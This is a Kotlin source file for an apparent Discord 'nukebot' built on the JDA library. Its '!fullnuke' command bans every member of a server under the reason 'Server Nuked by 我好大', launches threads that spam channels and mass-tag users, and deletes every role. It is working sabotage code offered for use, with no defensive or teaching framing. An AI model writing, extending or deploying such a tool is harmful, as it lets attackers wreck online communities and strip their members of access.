package thenano.nukebot.bot.command.commands

import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import net.dv8tion.jda.api.exceptions.PermissionException
import thenano.nukebot.bot.command.CommandListener
import thenano.nukebot.bot.command.CommandManager
import kotlin.jvm.Throws

@CommandListener.Info("!fullnuke <tag(true/false) <channelName> <contents>","nuke server",false)
class FullNuke : CommandListener() {

    @Throws(RuntimeException::class)
    override fun onEvent(event: MessageReceivedEvent) {

//BAN,del channel,del role,

        if (message.contentRaw.startsWith("!fullnuke")) {
            if (onInit(event)) return

            if (guild.selfMember.hasPermission(Permission.BAN_MEMBERS))
            {
                loop1@ for (member in guild.members) {
                    try {
                        guild.ban(member, 1, "Server Nuked by 我好大").queue()
                        println("Banned " + member.user.asTag)
                    } catch (e: PermissionException) {
                        println("Cannot ban " + member.user.asTag + "- PermissionException")
                    }
                    if (CommandManager.stop) break@loop1
                }
            }

            if (self.hasPermission(Permission.MANAGE_CHANNEL,Permission.MANAGE_ROLES)) {
                try {
                    val index = messageRaw.indexOf(" ")
                    val index2 = messageRaw.indexOf(" ", index + 1)
                    val index3 = messageRaw.indexOf(" ",index2+ 1)
                    val tag = messageRaw.substring(index + 1, index2).equals("true")
                    val content = messageRaw.substring(index2 + 1,index3)
                    val content2 = messageRaw.substring(index3+1)

                    val channelThread = Thread(SpamChannel.ChannelThread(content))
                    channelThread.start()
                    if (tag) {
                        for (i in 0..3) {
                            val tagThread = Thread(SpamChannel.TagThread(content2))
                            tagThread.start()
                        }
                    }

                    for (role in guild.roles) {
                        try {
                            role.delete().complete()
                            println("Deleted Role { name=" + role.name + " }")
                        } finally {
                            println("Cannot Deleted Role { name=" + role.name + " }")
                        }
                    }
                } catch (e: StringIndexOutOfBoundsException) {}
            }

        }
    }

}